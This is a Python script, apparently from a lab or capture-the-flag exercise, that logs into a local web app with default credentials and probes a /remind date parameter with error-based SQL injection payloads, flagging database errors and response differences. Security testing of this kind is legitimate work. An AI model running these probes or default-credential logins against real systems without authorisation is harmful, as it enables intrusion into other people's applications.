import requests
import re
from urllib.parse import unquote

# Target configuration
BASE_URL = "http://127.0.0.1:32997"
LOGIN_URL = f"{BASE_URL}/login"
REMIND_URL = f"{BASE_URL}/remind"

# Create session to maintain cookies
session = requests.Session()

print("="*70)
print("STEP 1: AUTHENTICATION (FIXED)")
print("="*70)

# Step 1: Login with user/user credentials
print("\n[+] Attempting login with credentials: user/user")
login_data = {
    'username': 'user',
    'password': 'user'
}

# First, disable allow_redirects to capture the Set-Cookie header
login_response = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
print(f"[+] Login POST Status: {login_response.status_code}")
print(f"[+] Final URL: {login_response.url}")
print(f"[+] Cookie in session: {dict(session.cookies)}")

# Check the redirect chain
if hasattr(login_response, 'history') and login_response.history:
    print(f"[+] Redirect chain:")
    for i, resp in enumerate(login_response.history):
        print(f"    Step {i}: Status={resp.status_code}, Location={resp.headers.get('location')}")
        if 'set-cookie' in resp.headers:
            print(f"    Set-Cookie: {resp.headers.get('set-cookie')}")

# Check if we're now on /transactions (success) or still on /login (failure)
if '/transactions' in login_response.url:
    print("[+] SUCCESS! Redirection to /transactions confirmed")
    # Visit /transactions to ensure we have a working session
    print(f"[+] Cookies after login: {dict(session.cookies)}")
else:
    print("[-] Login may have failed - still on login page or redirected elsewhere")
    print(f"[+] Response preview: {login_response.text[:500]}")

# Check current authentication state
print("\n" + "="*70)
print("STEP 2: VERIFY AUTHENTICATION")
print("="*70)

# Visit /transactions first (where we're redirected after login)
print("\n[+] Checking /transactions to verify authentication...")
transactions_resp = session.get(f"{BASE_URL}/transactions")
print(f"[+] Transactions page Status: {transactions_resp.status_code}")
print(f"[+] Current Cookies: {dict(session.cookies)}")

# Check if we're authenticated
if 'login' not in transactions_resp.text.lower() or 'logout' in transactions_resp.text.lower():
    print("[+] Authentication appears successful - we have access to transactions page")
    print(f"[+] Response preview:\n{transactions_resp.text[:1500]}")
else:
    print("[-] Still seeing login page - authentication failed")

# Now try to access /remind with valid date parameter
print("\n[+] Testing /remind endpoint with valid date...")
verify_response = session.get(f"{REMIND_URL}?date=2024-01-01")
print(f"[+] /remind Status: {verify_response.status_code}")
print(f"[+] /remind Response Length: {len(verify_response.text)}B")

# Check if we got the actual remind page or redirect
if verify_response.status_code == 200 and len(verify_response.text) > 2000:
    print("[+] We have access to /remind endpoint!")
    print(f"[+] Response preview:\n{verify_response.text[:2000]}")
else:
    print(f"[+] Response: {verify_response.text[:1500]}")

# Base response for comparison
print("\n[+] Capturing baseline response for comparison...")
baseline_resp = session.get(f"{REMIND_URL}?date=2024-01-01")
baseline_length = len(baseline_resp.text)
print(f"[+] Baseline response length: {baseline_length}B")

print("\n" + "="*70)
print("STEP 3: ERROR-BASED SQL INJECTION TESTING")
print("="*70)

# Error-based payloads to test
error_payloads = [
    ("Single quote", "'"),
    ("Double quote", '"'),
    ("Backslash", "\\"),
    ("AND 1=1", "' AND 1=1--"),
    ("AND 1=0", "' AND 1=0--"),
    ("OR 1=1", "' OR '1'='1"),
    ("Comment )--", "')--"),
    ("Comment --", "'--"),
]

print("\n[+] Testing error-based SQL injection payloads...")
anomalies = []

for desc, payload in error_payloads:
    url = f"{REMIND_URL}?date={payload}"
    try:
        resp = session.get(url, timeout=5)
        
        # Look for SQL errors
        has_error = False
        error_indicators = [
            'sqlite', 'mysql', 'postgresql', 'oracle',
            'syntax error', 'operationalerror', 'databaseerror',
            'unrecognized token', 'near', 'constraint', 'column'
        ]
        
        lower_text = resp.text.lower()
        found_errors = [e for e in error_indicators if e in lower_text]
        
        # Check for anomalies
        is_different = abs(len(resp.text) - baseline_length) > 50 or resp.status_code != 200
        
        if found_errors or is_different:
            has_error = True
            anomalies.append({
                'desc': desc,
                'payload': payload,
                'status': resp.status_code,
                'length': len(resp.text),
                'errors': found_errors,
                'response': resp.text[:1500]
            })
        
        status = "[!!!VULN!!!]" if found_errors else "[OK]" if not is_different else "[DIFF]"
        print(f"{status} {desc}: Status={resp.status_code}, Len={len(resp.text)}, Diff={len(resp.text)-baseline_length}")
        
        if found_errors:
            print(f"    Errors found: {found_errors}")
    except Exception as e:
        print(f"[ERROR] {desc}: {e}")

# Print anomalies in detail
if anomalies:
    print("\n[!] ANOMALIES DETECTED:")
    for a in anomalies:
        print(f"\n[!] {a['desc']}")
        print(f"    Payload: {a['payload']}")
        print(f"    Status: {a['status']} | Length: {a['length']}")
        print(f"    Errors: {a['errors']}")
